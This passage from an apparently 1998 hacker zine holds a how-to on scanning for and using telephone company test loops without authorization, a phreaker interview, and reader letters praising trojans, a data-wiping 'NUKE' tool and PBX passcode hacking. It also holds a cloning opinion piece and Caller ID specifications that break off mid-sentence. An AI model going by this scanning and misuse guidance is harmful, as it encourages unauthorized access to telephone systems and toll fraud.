[2]  Why loops are setup by the telco.
[3]  How to detect a loop.
[4]  How to scan and find loops.
[5]  How to use loops.

As you can see, only the basics of loops will be covered in this article.  If
you want to examine lists of loops (for any area code) and look for patterns,
then that might also benefit you.  Let's begin the quest for knowledge about
loops, one of the most interesting tones.  Get ready to start looping the loop.

Loops are interesting tones that have two ends.  One end of a loop is called
the high end and the other is the low end.  (Did you think I was talking about
Fruit Loops?)  :)  Loops exist in all area codes.  Usually there are many loops
in each area code.  Sometimes there are multiple loops for every exchange.
Basically, loops are two lines that are connected.  Or, if it's easier for you
to understand, two different phone numbers that have a relationship.  Both
numbers will be in the same local exchange.  An example would be 514-555-9996
and 514-555-9997.  If you've ever seen a list of loops, then you already know
what typical pairs of loops look like.  Or, maybe you've read about what a
cheese box is.  If not, read a text file on them and build one.  The basic
example that I gave isn't always how loops are setup though.  There isn't always
just 1 digit separating the high end from the low end.  They can be setup in
literally any configuration.  There could be 2, 3, 4, 5, 10 digits between the
two numbers.  Sometimes the span is greater than that to discourage people from
finding and using the loop.  The point is that not all loops are setup the same
way.  The telco owns them and doesn't like it when other people use them.  They
are fairly safe to use though and the telco never really bothers to try to stop
anyone from using them.  :)  However, be aware of the fact that Bell can monitor
their loops and listen in on conversations at any time.  So, be careful about
the types of things you discuss.

Loops are setup by the local telco for several reasons.  They're used by telco
workers for testing many different things.  One of the main purposes they use
loops is for testing long distance trunks.  By utilizing loops, the telco can
save time and manpower.  They require less lines, less telco workers and the
loops are always there ready to use for testing.  I won't get too technical
with jargon, but it is important that you know the basics of how loops are used
by the telco and why they are setup.  A Telco linesmen/technician can dial the
lower number of a loop and a 1000 HZ tone will be emitted at a zero db level.
He can use a meter to gauge whether or not there are any problems on the line.
If he needs to do complete testing at several frequencies then he can turn on
the filter bypass switch.  Before there were any loops, trunks had to be tested
by two techs with one at each end.  One tech would send a 1000 HZ test tone
through and the other would read the volume using a meter.  Then he'd send a
signal back to the first tech to test it.  That required too much planning and
two telco workers were required for testing.  Thus, loops were created by
connecting two lines together as a simple solution for testing and adjusting
trunks.  Due to loops, the trunks can be tested and adjusted by a single tech.

I'm not going to explain everything about trunks and repeaters since you can
read information on them elsewhere and learn.  The only other thing that you
need to know about trunks at this point is that they are tied together by a
zero loss terminator which connects lines together so that there's no change
in volume.  That's why it's called "zero loss".  :)  To test a suspect trunk the
tech dials the loop with his meter connected.  Then he dials the other half of
the loop using a trunk that he knows is good (one that isn't faulty or noisy).
After that's been completed, he reverses the signal path as described above to
finish the test.  If you wish to learn more about signals, frequencies, carrier
trunks, transmitters, terminators, filters, switches etc. then I recommend
obtaining a Bell manual and looking for the technical information that you need.

Most loops don't ring when you dial them, which makes the task of detecting them
fairly easy.  You can also detect loops by what you hear after dialing the
number.  It depends on which number you dial.  If you're scanning and happen to
dial the low end, then you'll hear a 1000 HZ tone.  If you dial the high end,
then you will hear nothing.  It's silent unless someone else is on the other
end.  So, if someone is using the loop already, then you'll be connected and
hear them talking.  Sometimes you'll hear a large group of people talking to
each other as loops are often used as an informal 'meeting place'.  Don't be
too surprised if you encounter a private loop party and you're not invited.  If
you're not wanted, then hang up and don't bother them.  You can always use the
loop some other time.  You don't want to anger any local phreaks that might be
using the loop for something important.  That should be enough information on
detecting loops while scanning.

You might be wondering just where to begin scanning for these amazing loops.
In order to make your task of scanning and finding some loops easier, I'm going
to give you a few tips.  Using THC-Scan (no affiliation with my alias) or
ToneLoc, try entering 555-00XX, 555-11XX, or 555-99XX as a dialing mask.  The
555 represents the exchange of your choice to scan.  Usually, loops are found
in one of those three suffixes.  Sometimes, they're the same for each local
exchange.  So, if you find loops in one exchange in say NPA+XXX-99XX then try
scanning that same range in another exchange.  NPA is Numbering Plan Area.  It
is just the area code.  The NPA of (514) 123-4567 would be 514.  Some people
use ACN (Area Code Number), but NPA is the proper, accepted term.  The exchange
(or NXX) for that number would be 123.  So, now if you see a number such as
NPA+NXX-XXXX you'll recognize it and understand what it means.  :)  You may find
as many as 20+ loops in a single exchange.  In a large area code you might find
50-75 loops.  In smaller area codes (with less exchanges in use), there should
still be about 5-10 loops.  If you scan using these methods and can't find any
loops, try asking a local phreak in your area code for some scanning advice.  :)

Loops can be quite useful.  Just because they're owned by the telco doesn't mean
that we can't use them.  Afterall, they're already there and unused most of the
time.  So, if something isn't being used for anything, then we might as well put
it to good use for our own purposes.  :)  There's absolutely no harm in doing
that.  If however the loop is being used for testing though, avoid trying to use
it.  They're usually being used by the telco for testing during the day, so you
shouldn't attempt to use them during the day (business/working hours).  You may
be wondering how loops are beneficial to you and what to use them for.  Well,
if nothing else it's always good to experiment and learn about the phone system.
Using loops is a harmless way of doing that.  You can also use loops so that you
remain anonymous by giving someone the number of a loop to call instead of your
home phone number.  Tell them what time to call you, and be waiting for them on
the loop.  Just don't forget that Bell might be listening in.  So, they don't
exactly offer complete anonymity.  A good use for loops is for conferences.
They're almost like big party lines.  You can dial and meet new people, or
arrange meetings with phreaks that you already know.  It's a good way to get a
large group of people together for a conference since people can join it at any
time.  They're a blast and the best 'feature' is that they're totally free.  :)
Loops are toll-free, no charge.  Once you become more experienced, you can do
'advanced tricks' like looping around the world.  Or you can hang out, talk with
cool people (phreaks like me) for hours and it won't cost you a cent.  Another
benefit is that you can meet some very intelligent, knowledgeable people that
you otherwise wouldn't have.  At least, that's been my personal experience.
Scanning and using loops may be 'illegal' in your area.  So, I'm not responsible
if you're traced and get busted.  :)  Regardless of that, have some phun and
happy THC phreaking.

I plan to write more articles for the Damage, INC. Newsletter in the future.
I'm proud of this one and thankful that it was good enough to be published.  If
you have any questions or comments about it, post a message to me on AJFA and
I'll try to reply as soon as possible.

ú - NEWS - ú

There's not much news to report this month.  However, there is a rather
important matter concerning the Damage, INC. Newsletter that needs to be
mentioned.  We're overloaded with work, and lacking in time.  Therefore, in
order to complete certain unfinished projects (such as the Damage, INC. FAQ)
and maintain the quality of our releases, there may not be a May issue of the
Damage, INC. Newsletter.  If the end of May arrives and there isn't an issue
released, then we'll keep you informed.  Even under these circumstances, we
will still try to release a new issue by the middle of June.  As we include
more information in each issue, do more indepth research, increase the size of
each issue, etc. it may become impossible to stay "a monthly newsletter".  If
that does happen, you can be assured that we won't just quit and die...  So,
don't start rumours or make any false assumptions about Damage, INC. based
upon the time span between issues.

INTERVIEWS AND INTERROGATIONS -                                {INTERVIEWS}
An Interview of THC Phreak:

This is a recent interview that I conducted with THC Phreak.  Since he's a
Damage, INC. Writer now, I felt that it would be a good idea to interview him
so that readers would be able to learn a little about him.

<B>   = BLACKENED
<THC> = THC Phreak

<B> - Introduce yourself to the readers of the Damage, INC. Newsletter.

<THC> - My alias is THC Phreak and I'm from the 514 area code... I've been
into h/p for a number of years... mainly phreaking... and have just started
to become more actively involved in the scene recently.

<B> - What meaning does your alias carry?  (Obviously, I already know the
answer but the majority of these questions are asked for the benefit of the
readers).

<THC> - Okay... THC stands for Trans-tetraHydroCannabinol.  It's the chemical
in marijuana that is responsible for getting you high.  :)  That's just part
of it.  I chose this alias a long time ago (2-3 years)... because I was toking
a lot back then and was really interested in phreaking.  So, I thought it was a
perfect match.  I started to phreak and was a THC freak.  That's the main reason
why I thought of it, and that's the meaning behind it.

<B> - Alright, that's understandable.  How did you become interested in
phreaking?

<THC> - Well, that's a really good question... As I said before, I became
interested in phreaking about 2-3 years ago.  I'm trying to remember how that
happened.  The reason why is that I like learning about things and I am
naturally curious about things that most people ignore.  The only answer as
to how I became interested in it is that I saw some issues of Phrack magazine,
a few text files on different boxes etc. on some local boards, downloaded and
read them.  After that, I wanted to learn as much about phreaking as I could.
It took me a little while to get past the 'beige boxing' phase.  Once I lost
interest in the boxing shit, I wanted to start learning about the actual
telephone system... and how to use it.

<B> - Yeah, that's cool man.  ;)  What magazines other than Phrack do you
read?  Are you interested/involved in hacking?

<THC> - I'm more interested in phreaking... and have very little hacking
experience.  Hmmm, I read quite a few magazines... CUD, cDc, THC etc. and
of course the Damage, INC. Newsletter.  :)

<B> - Do you think that magazines that have articles submitted by readers
(such as Phrack for example) are more informative than ones that are written
almost entirely by the staff/group?

<THC> - Overall, yes, I think that they are.  Phrack is established, well
known, very informative and highly regarded... It's thought of as being the
best h/p magazine around.  I'd have to agree and say that it is.  I've read
a few articles in Phrack (and other magazines) that were sent in and published
that weren't very good though.  It's a compromise.  Sometimes the ones that
have a mixture between articles written by the group and readers are just as
good.  :)

<B> - That's true.  I have respect for Phrack and the various Phrack editors
that have put it together over the years.  While we're on the topic of readers
contributing articles, how do you think being a Damage, INC. Writer will benefit
you/readers/the h/p scene?

<THC> - I think that the articles I submit to Damage, INC. will help readers
of the Damage, INC. Newsletter.  I feel that by sharing knowledge and
experiences, that I'll benefit as well... by learning how to write quality
articles and share what I know.  It's been a learning experience in itself.

<B> - Personally, I think that by associating with others that are at the
"same level" of knowledge or greater, one can learn a tremendous amount.  Do
you agree/disagree with that statement?

<THC> - I agree with that.  When I was a newbie, I learned a lot from some
of the local phreaks in my area code.  I'm still learning though, and try to
converse with as many phreaks as I can... That is the best way to learn.  :)
People know about different things, so exchanging knowledge and ideas just
makes sense.

<B> - Yeah, that's basically what I've been trying to convey to the readers
of the Damage, INC. Newsletter.  Perhaps I haven't expressed myself clearly
enough to them yet.  Hopefully this interview will get that point across.
What about the ethics of phreaking?  What are your opinions on that?

<THC> - I don't think there's anything wrong with exploring.  That's what
phreaking means to me... learning about the telephone system and all that
it encompasses.  There's absolutely nothing wrong, as long as no damage is
caused by the phreak.  What's the harm in wanting to know how things work?

<B> - Do you ever explore any systems?  Are you interested in learning how
to hack anything?

<THC> - Yes, I have explored systems before... and enjoy experimenting with
them.  I've basically hacked small networks and passcodes for things so far.
But I am interested in learning more about the art of hacking.  Right now
though, my hacking skills aren't that impressive.  :)

<B> - Now that you've been in the h/p scene for a few years, what advice would
you give to newbies?

<THC> - I'm not an expert or anything, and don't pretend to be.  However, I
think that newbies should read about things first, and then once they know
something about it they can experiment using that newly acquired knowledge.
Newbies should also the difference between good information and bad information.
What I mean by that is this, some information is real... and the rest is fake.
I've read some text files that gave wrong information before.  They looked as
if they'd been written by a newbie or a wannabe of some sort.  I don't think
that's very good for the scene.

<B> - I agree.  It's harmful to the scene, since many people that read it
will believe the misinformation simply because it's written in a text file.
There are a few wannabe groups in 519.  There always has been.  Thankfully, most
of them didn't last too long.  A few died after releasing a few shitty text
files.  ;)  One last question, what do you think of h/p groups?

<THC> - In my opinion, the active ones are a benefit to the scene.  The groups
that release quality information deserve respect.  I now know that it takes
time to write a good article, and applaud everyone else that writes them on
a regular basis.  :)

<B> - Thanks for agreeing to do this interview man.  I hope that it has
enlightened the readers of the Damage, INC. Newsletter and given them some
things to think about.  I'm sure that they've learned a little about you as
well.  ;)

<THC> - You're welcome.  I was glad to participate and I'll contribute whenever
I can.  It was an enjoyable experience.  :)

<B> - This concludes another Damage, INC. interview.  We plan to interview more
people in the h/p scene in future issues, so look for them.


LETTERS TO THE EDITOR -                                           {LETTERS}

Date: 6:38 pm  Wed Apr 22, 1998        Number : 106 of 111

FV> In a earlier message Blackened stated that there is not enough feedback..

Here's some feedback:

In your interviews with Bill Gates, its not very funny anymore as him being a
spineless snivelling snothead.  Give him some good attributes (wether it be he
can pick his ass with his pinky, or masturbate in under 10 seconds, I don't
care.  Just something good...  :)

And in #7 - For some reason, I could only read to the EOF in the first or
second line of coding in the Trojan.  I downloaded the newsletter twice, and
both times I got no errors in unzipping.  Help?
-------------------------------------------------------------------------------

Editor - Dizzy, the interrogations of Billy Gates are meant to be sarcastic,
         humourous, and at the same time an accurate portrayal of Billy's
         character.  That's how we view his personality, and many of the
         traits and expressions used are realistic.  He is arrogant, greedy,
         wimpy, stubborn, defiant, egotistical, paranoid etc.  Also, many
         readers have commented on those interrogations and said they found
         them to be hilarious.  Thus, the saga will continue.  As I'm sure
         you've noticed, they aren't included in each issue... nor will they
         ever be in every issue.  I have yet to play the role of Billy Gates.
         Thus far, other Damage, INC. Members have done that job.  We've
         tried not to make them overly "immature", and always make sure we
         mention certain things that are happening at the time with Micro$oft
         and the industry in general.  We're going to put more recent incidents
         and events into future interrogations of Gates.  Damage, INC. also has
         plans to do mock interrogations of other fat cats and public figures
         in future issue.  So, you can look forward to reading those.  However,
         if you don't enjoy reading them, then you can skip that section.  It's
         your choice, as you are the reader.  ;)

         As for the trojan, the source code includes an EOF character in it.
         Therefore, you must read it using a text editor/viewer.  Downloading
         new copies won't solve the "problem" that you're experiencing.  It
         has nothing to do with the Pkzip file being corrupt or anything either.
         The  character is there to prevent someone from using the DOS TYPE
         command to view the .com file.  Of course, now you might not be able
         to read the rest of these comments beyond the EOF marker... again.
         It's unfortunate that you were prevented from reading the rest of the
         Damage, INC. Newsletter Issue #7 due to the use of that single
         character.  If you don't figure it out after reading my response to
         your letter, I'll leave you Email.


-----  aenima's letter to the editor -----

my alias is aenima and i promised to blackened that i would send him feedback
to the Damage, INC. newsletter.  i wanted to post this on foi or call ajfa
but i have been busy this month and haven't had a chance and foi offline mail
doesn't work.  it will not let me download a copy.  so i thought i would make
a text file instead of posting a message.  hope that's ok. :)

now for my letter to the editor i would like to start off by saying that
in my personal opinion i feel it is a great magazine.  once distributed
to more area codes and perhaps setting up a ftp/www site would be benificial
and create awareness.  i am curious as to what area codes it is already
released to and will do my best to distribute it.  my local scene seems to
enjoy reading it and their is now a constant flow of messages about Damage, INC.
however, i myself know a little about the group since i have read some bases
on Freedom Of Information, read the Damage, INC. newsletter, tested some
Damage, INC. utilities.  so i have been trying my hardest to keep users in my
area code informed about Damage, INC.  and they are waiting for this issue.

The new section that was added to the Damage, INC. newsletter called
Drugs Discussion is looking quite promising to me.  i am a freqent toker
and look forward to reading things in that section.  maybe even contribute
a few articles.

i have a major suggestion for the source and scripts section.  i think its
great that there are commented source code made by Damage, INC. in the
newsletter however have you ever thought about going into a little bit of a
tutorial???
i know that many people would like to learn how to program in asm to create
viruses, trojans, and some utilities but are not aware how to start etc.  i
know you suggested that people download HELPPC.ZIP TASM31.ZIP and SR504.ZIP
but i am not sure exactly how to use that to my advantange.  i know some people
in my area that are pretty much amazed at some of your utilities.  and as i
have said before one of my buddies had a BUST.BAT file and had to use it in
a tight situation.  it did work.  and he was very happy with Damage INC. and
the util that he decided to use.  (NUKE v1.00) and i know that NUKEKB.ZIP has 
been very useful to me.  :)  as i can think of many useful utilities that i
could program.   so it would be nice in an issue to assume that some people 
don't know to much about ASM and PROGRAMMING.

i really like the introduction and conclusion that has been done in each
issue :)  some are hilarious as well as the actual newsletter names.
and statement "for people to identify a theme in every issue" has been
properly implaced and i can always tell what it is.  

i enjoyed reading The Journalist's article about "PSYCHIC WARRIORS" i though it
was really enjoyable, and do believe that could happen.  the whole out of body
placement.   Blackie Lawless' articles are very good and informative.
people in my area code have learned quite a bit from that article.  the PBX
one taught quite a few people in my area code a bit more about pbxs and they
were able to scan/hack passcodes.  and now have working pbx codes.  i was quite
impressed to see this.  because there is a real lack of extenders in our area
code so we have to rely on things like pbxs, and operators etc. :)  also i 
enjoy reading Blackened and Shatazar's articles as well.  they are really
informative and make everyone reading them wonder "how much research goes into 
them????"  like how much time do you spend reading about the topic.  how do
you decide what topics you are going to do and who does what???  how much 
time in total do you think you guys spend doing the Damage, INC. newsletter?

anyways. this concludes my thoughts about the Damage, INC. newsletter  if
you wish to use this then be my guest. that's what it was intended for.
i wish the best for the group and hope it expands and gets many readers.

Editor - Thanks for the feedback man.  I always enjoy hearing from our loyal
         readers.  ;)  Anyways, we're working on improving the distribution
         aspect.  Any help that you can provide by distributing the
         Damage, INC. newsletter in your area code is appreciated by us.
         Also, your comment saying that you feel it's a great magazine is
         well taken.  Thanks again for the compliment.  ;)

         As for the new Drugs Discussion section, we also feel that it's
         promising and holds potential.  We won't to raise awareness in our
         readers in relation to drugs etc.  If you want to contribute by
         writing an article on drug experiences or whatever, then that would
         be great.  We definitely want to publish more articles that are
         written by our readers... and add a "personal touch".  We also want
         to write articles covering drug issues to dispel common myths and
         destroy the misinformation that exists about drugs.

         Your suggestion for the Source and Scripts section (writing a tutorial)
         is something that we've thought about and discussed within the group.
         I realize that many people don't program in any language, or know much
         about assembly.  I've tried to heavily comment the source code, but
         I can understand how it might seem difficult to read/learn.  I'll
         definitely think about creating a tutorial for beginning assembly
         programmers.  As I've said many times, any and all suggestions will
         be considered.  The only restriction at this point is time, in that
         we have many unfinished projects (The Damage, INC. FAQ is one of them)
         that need to be completed first.  However, I won't forget about your
         request for a tutorial on asm... In fact, it is something that I've
         wanted to work on for a long time.  Many people in this area code
         know very little about assembly, so it's needed.

         As for the BUST.BAT, I'm glad it was useful in your friend's situation.
         I hope that everyone also finds my tips on how to avoid being busted
         (in this issue) to be just as reliable.  ;)  As for NUKE, NUKEKB and
         the other Damage, INC. Utilities, I'm glad they're being put to good
         use by people in area codes other than 519.  They were written with
         the intention that they'd be used... so it feels good knowing that
         people are using them to their own advantage and benefit.

         I've written every Introduction and Closing Comments thus far,
         excluding this issue in which Shatazar wrote them.  The quotes for
         each issue (except for this one) were also chosen by me.  So, I'm
         glad you enjoyed them man.  That's where most of my creativity is
         expended.  ;)  As for the themes, yeah, that's exactly what we've
         been attempting to do with each new issue.  Some of the introductions
         that I've written are what I'm most proud of.  I was pleased with a
         few Closing Comments as well.

         The Journalist's PSYCHIC WARRIOR article was very well written and
         one that I greatly enjoyed reading also.  A few people have made
         comments about that particular article.  ;)

         That's excellent that people have learned from Blackie Lawless'
         h/p related articles.  A couple of readers have said that he should
         become an instructor/teacher because of the way that he is able to
         express himself.  I agree with those sentiments.  ;)  Hopefully he'll
         be able to contribute articles again in the near future.  As for the
         people that are now able to use PBXs, that's the type of feedback that
         we really enjoy hearing.

         As for the research, quite a bit goes into those articles.  Whenever
         possible, we use several sources of information to ensure that the
         information we provide is accurate and reliable.  We don't want to
         misinform readers (like the mass media frequently does).  Therefore,
         avoiding that is a big priority and taken seriously by Damage, INC.
         Personally, I read newspapers, numerous magazines, watch several
         news stations, read text files and information from internet sites,
         and sometimes speak with sources (people involved) before writing an
         article on a topic.  I try to research and get as much insight as
         possible before actually writing about something.  To be honest, I'm
         not sure how much time goes into research.  It varies from topic to
         topic.  With certain topics, I know them fairly well before I even
         begin to research it since it interests me.  Some things affect me
         directly, thus some research has already been done.  I do a fair
         amount of reading about various things (Conspiracies, Big Brother,
         current events etc.) though.  As for how we decide what topics are
         written about and who writes the articles, sometimes it can be a
         complex process.  Hehe.  The topics are usually discussed privately
         beforehand... and if someone has an idea for an article on a certain
         topic, they tell me about it.  Then I notify everyone once they've
         selected a section for the upcoming issue.  So, then I put their alias
         in the Contents beside that section and everyone else knows that it's
         been taken once they download a new, updated, pre-release copy.  Other
         than that, I don't delegate which Damage, INC. Members write for each
         section.  Nothing is "assigned" to anyone in that respect.  That's
         the first time anyone has asked about that.  ;)  As for an estimation
         on the amount of time I think we spend writing the Damage, INC.
         Newsletter, that's a difficult question to answer man.  The best answer
         that I can give is to say that countless hours go into thinking of new
         ideas, research, writing, programming and testing source code, editing,
         proofreading, and distributing each issue.  As Editor/Publisher, I
         wouldn't begin to count the hours that are dedicated to this relatively
         small publication.  It does take more time and work than most of our
         readers realize though.  In fact, lately I've thought about changing
         it from a monthly newsletter to one that's released with no fixed
         schedule.  Basically, it's a tremendous amount of work and sometimes
         time is the greatest factor working against us.  In other words, we
         have been rushed to finish certain issues and that's when it becomes
         more of a chore than an enjoyable endeavour.

         Thanks for the kind wishes for Damage, INC. and the Damage, INC.
         Newsletter.  We intend to expand and grow stronger.  We hope that
         our readers will grow, learn and continue to think from an informed,
         objective, unbiased, enlightened perspective.  Diversity and knowledge
         are the keys to the success of the group in my opinion.  As long as
         we're able to release quality and think of new ideas, then Damage, INC.
         will remain as an important, useful source of information.  The group's
         existence isn't dependant upon any one member.  It consists of capable,
         intelligent, enlightened individuals.  However, there's no "prez" or
         official "leader".  Therein lies much of its strength.  We encourage
         individualism, and the group doesn't rely on a "leading figure" to
         hold it together.  Even though I'm the founding member, I have taken
         measures to prevent a collapse of Damage, INC. in the event that I am
         forced to quit.  I just decided to include this small portion that
         describes some of the inner workings of the group, in case people are
         interested in that type of thing.  ;)  More information relating to
         the group will be in the Damage, INC. FAQ, which should be ready to
         release soon.  I believe that I've responded to every portion of your
         letter to the editor, so I'll end my rambling now...


OBJECTIVE OPINIONS -                                             {OPINIONS}
The Consequences of Cloning Humans:

Human Cloning is a hot topic in the media one week, and virtually ignored the
next.  Many articles have already been written about it, viewpoints have been
shared, heated debates have been started, laws have been written and enacted,
and yet the majority of what's been said and done has been from the same
perspective.  That is the reason that I've decided to share my thoughts and
opinions on cloning humans.  Obviously, you can agree or disagree with the
points that I make and the opinions that I express.  However, I ask that you
at least consider them and not ignore the many possibilities and consequences
of cloning human beings.  After you've finished reading this article, form
your own opinions from an informed standpoint.

Religious groups, governments and many average people are beginning to panic
and think irrationally about cloning and the problems that it might present
in the future.  The 'poster child' for the development of human cloning seems
to be an eccentric Chicago physicist named Richard Seed.  Seemingly out of
nowhere, he dropped a bombshell on the media by announcing that he wants to be
the first person to clone human beings.  At this point, I'm sure many of you
have already heard about Dolly, the sheep that was cloned in Scotland.  You may
even know a little about the technique that was used.  You may also know that
it took many attempts (reportedly 277) before they were successful at cloning
a sheep.  That amount of repeated attempts to produce a cloned sheep might seem
like a huge amount to some, and a small amount to others.  However, just by
using common sense and logic, you can determine that it'll also take many
attempts before a human being can be cloned successfully.  Perhaps more than a
thousand attempts.  Obviously, the technique that was used to clone a sheep
hasn't been perfected... In fact, it hasn't been used yet to clone humans.
Thus, the science of cloning still has a long way to progress before it'll ever
be widely used or accepted by the scientific community.  At this point, many
scientists are condemning anyone that wants to try to clone humans.  Some of
them site scientific reasons, stating that it's unsafe, there would be a great
loss of life in failed attempts and strange results etc.  Others feel that it's
morally wrong to clone human beings.  Richard Seed doesn't fit into the same
category as most other scientists of this time.  He's been described as being
a well educated, brilliant, bizarre, unpopular, publicity seeking, misfit that
most scientists refuse to support.  Indeed, Seed is faced with great opposition.
President Bill Clinton has banned human cloning in the United States and deemed
it to be "untested and unsafe and morally unacceptable."  Ian Wilmut, the person
responsible for producing Dolly, doesn't agree with human cloning either.  He
also posed the question "Should we really consider or allow experiments of this
kind with people?"

Will Seed be the one that plants the first seeds of Human Cloning?  Many
so-called 'experts' doubt his abilities and don't feel that he's capable of
cloning a human.  In fact, Seed has been mocked and ridiculed by numerous
mainstream scientists.  In Seed's defense, he did graduate from Harvard with
a doctorate in physics.  He then became interested and involved in biomedicine.
He and his brother Randolph Seed (a Chicago surgeon) formed a company called
Fertility & Genetics Research Inc. that helped infertile women conceive
children.  Therefore, Seed does have a strong background in genetics which
should help contribute to his cloning experiments.  He's also convinced that
the public opinion will eventually shift and the opposition to cloning will
cease.  Seed has been quoted as saying "God made man in his own image, God
intended for man to become one with God.  Cloning... is the first serious step
in becoming one with God." during a radio interview.  During a CNN interview
Seed stated that "Man, will develop the technology and the science and the
capability to have an indefinite life span."  That's quite a bold prediction.
If anything Richard Seed is a very confident, brash, blunt person... for which
he deserves some respect in my opinion.

Now that you've read some of the things that Seed has said, I will elaborate
on his words... and share my opinions with you.  When Seed spoke about man
having an indefinite life span, he was probably referring to cloning humans
for organs.  Growing human organs and using them to replace the ones that are
failing us, could enable us to live much longer lives.  In essence, his use
of the term "indefinite" is correct.  Our life span would be increased
tremendously.  However, a price would have to be paid for that benefit.  As
in, the technology was be abused, misused, and the black market sale of organs
would be big business.  It's already profitable today, but with the ability to
clone organs, the governments of the world would almost assuredly want a piece
of the action.  Not only that, the rich would benefit the most since they would
be the ones that could afford to pay for the procedures and extend the length
of their lives.  The pandora's box would be wide open.  I can vividly picture
the commercials and advertisements now:  "Immortality for only $99,999 in three
easy payments."  "Free dinner with your first transplant operation."  The rich
would have the choice of cloning their own organs, or buying organs that were
cloned from someone else.  If that's not an ominous thought, what about cloning
babies?  Imagine the vain, narcissistic, wealthy fat cat couples proudly
displaying their cloned children.  It's the ultimate in vanity.  They could brag
to their friends and neighbours about the fact that they're babies are in their
own image, exact replicas, with the same DNA.  Do we really need another Bill
Gates?  Honestly, I shudder at the thought of that.  I'm sure he'd also have a
few clones of himself just for spare parts, in case they're ever needed in an
emergency.

There's also another issue.  Clones wouldn't be considered to be "real human
beings", therefore they would most likely end up as slaves.  Just imagine an
entire work force of clones... employed by large corporations... with their
genetics designed specifically for certain tasks.  Would killing a clone be
illegal?  Would mistreating them be considered immoral?  Would they have any
human rights at all?  I think not.  In fact, it wouldn't surprise me if entire
armies were made up of clones.  They'd be more expendable than genetically
normal soldiers.  Their DNA could be easily modified to create superior soldiers
for different combat duties.  They could test and select the best soldiers to
clone.  If a million of them became casualties in war, they'd already have
soldier clones in training ready to replace them.  They wouldn't even have to
notify anyone about their deaths, or report the number of clones that were
killed in battle.  Nobody would care.  Wars would be waged indefinitely, as
there wouldn't be any reason to end them... since the loss of clones wouldn't
matter to anyone on either side.  The clones wouldn't be important, they'd
just be biological machines owned by us.  Obviously, a clone can't be called an
individual, which is what makes it so vulnerable to oppression and enslavement.

What would be the result of taking DNA from someone such as Charles Manson
and cloning them?  What about cloning Albert Einstein?  Would convicts be used
in experimental human cloning?  Would it be considered wrong to clone certain
people, and acceptable to clone others?  Would the clone be the exactly the same
psychologically, emotionally, intellectually etc. as the original person?  Does
genetics dictate everything, or do life experiences play a role?  What is the
leading factor in determining how someone is going to develop?  How much of us
is caused due to genetics?  Is the environment that a person grows up in
critical to their behaviour and intellect?  Would clones of intelligent people
be able to attain the same level of knowledge, after being born at a different
time?  What role does time play?  If the clone can't meet and associate with the
same people, can they then learn the same things in the same way or would that
be a limitation?  Technology also evolves and changes over time.  The clones
would be exposed to a different world than the original.  How would that affect
them?  They don't know the answers to those important questions yet.  There are
too many possibilities to list or even begin to discuss.  At this point, they
can only theorize about what could/would happen.  However, I can give my opinion
and attempt to predict the results of their efforts to clone humans.  I believe
that they would try to clone certain people that are/were highly intelligent.
That could backfire though.  What if massive amounts of geniuses were cloned to
"fix" the world's current problems?  Would that really be a solution?  Or, is
it possible that it would create more serious problems?  I don't claim to have
all of the answers, but I have thought about this issue and considered the
possibilities and consequences of cloning humans.  I think that eventually
someone, somewhere will clone a human being and then the "cloning race" will
start between nations.  Or perhaps "clone wars" is a more appropriate term.
It's inevitable.  In any event, a Brave New World awaits us...

In closing, Human Cloning is an ethical, moral, religious, scientific issue
that'll continue to be debated for many years.  In my view though, cloning
human beings is a human issue.  I'm against anything that removes individualism
and destroys the essence of what it is to be human.  In the end, humanity will
suffer as a direct result of the misuse of cloning.  The consequences can be
disastrous, as explained earlier in the article.  That's not only my opinion,
but also my personal prediction.  Not all technology is good, useful and
beneficial to us.  Also, any technology that is viewed as being beneficial can
also be just as destructive.  Lastly, think about and consider all of the other
possible uses for cloning that were not mentioned in this short article.  We're
literally on the verge of entering a Brave New World.  I suggest that you
continue to educate yourselves, be prepared for any changes that occur and
become informed individuals... not just citizens.

Caller ID Specifications:

This article was included since many people are still either misinformed or
lacking in knowledge relating to Caller ID.  As you can see by the date below,
it's not recent information.  However, it still applies today.  The only thing
that has changed since it was written is that Caller ID service is now widely
available.  Bell supports Caller ID service basically everywhere in North
America now.  (All States and Provinces).  Other than that, the information
contained is still useful and relevant.

This is a copy of the data sheet picked up at the Rockwell
booth at the COMDEX show.

INTRODUCTION

Calling Number Delivery (CND), better known as Caller ID, is a
telephone service intended for residential and small business
customers.  It allows the called Customer Premises Equipment (CPE) to
receive a calling party's directory number and the date and time of
the call during the first four second silent interval in the ringing
cycle.  The customer must contact a Bellcore Client Company to
initiate CND service.

According to Pacific Bell representatives, the following states and
district currently support CND service: Delaware, District of
Columbia, Florida, Georgia, Idaho, Kentucky, Louisiana, Maine,
Maryland, Nebraska, Nevada, New Jersey, Oklahoma, Tennessee, Vermont,
Virginia, and West Virginia.

The following states are scheduled to support CND service by April,
1992: Alaska, Arizona, California, Colorado, Illinois, Indiana, Iowa,
Massachusetts, Mississippi, New Hampshire, New York, North Carolina,
North Dakota, Ohio, Oregon, Rhode Island, and South Carolina.

PARAMETERS

The data signalling interface has the following characteristics:
	Link Type:				2-wire, simplex
	Transmission Scheme:		Analog, phase-coherent FSK
	Logical 1 (mark)			1200 +/- 12 Hz
	Logical 0 (space)			2200 +/- 22 Hz
	Transmission Rate:			1200 bps
	Transmission Level:			13.5 +/- dBm into 900 ohm load

(I have copied this data as presented.  I believe the transmission
level is meant to be -13.5 dBm.)

PROTOCOL

The protocol uses 8-bit data words (bytes), each bounded by a start
bit and a stop bit.  The CND message uses the Single Data Message
format shown below.

Channel	Carrier	Message	Message	Data		Checksum
Seizure	Signal	 Type	 Length	Word(s)	  Word
Signal			 Word	  Word

CHANNEL SEIZURE SIGNAL

The channel seizure is 30 continuous bytes of 55h (01010101) providing
a detectable alternating function to the CPE (i.e. the modem data
pump).

CARRIER SIGNAL

The carrier signal consists of 130 +/- 25 mS of mark (1200 Hz) to
condition the receiver for data.

MESSAGE TYPE WORD

The message type word indicates the service and capability associated
with the data message.  The message type word for CND is 04h
(00000100).

MESSAGE LENGTH WORD

The message length word specifies the total number of data words
to follow.

DATA WORDS

The data words are encoded in ASCII and represent the following
information:

o  The first two words represent the month
o  The next two words represent the day of the month
o  The next two words represent the hour in local military time
o  The next two words represent the minute after the hour
o  The calling party's directory number is represented by the
   remaining  words in the data word field

If the calling party's directory number is not available to the
terminating central office, the data word field contains an ASCII "O".
If the calling party invokes the privacy capability, the data word
field contains an ASCII "P".

CHECKSUM WORD

The Checksum Word contains the twos complement of the modulo 256
sum of the other words in the data message (i.e., message type,
message length, and data words).  The receiving equipment may
calculate the modulo 256 sum of the received words and add this
sum to the reveived checksum word.  A result of zero generally
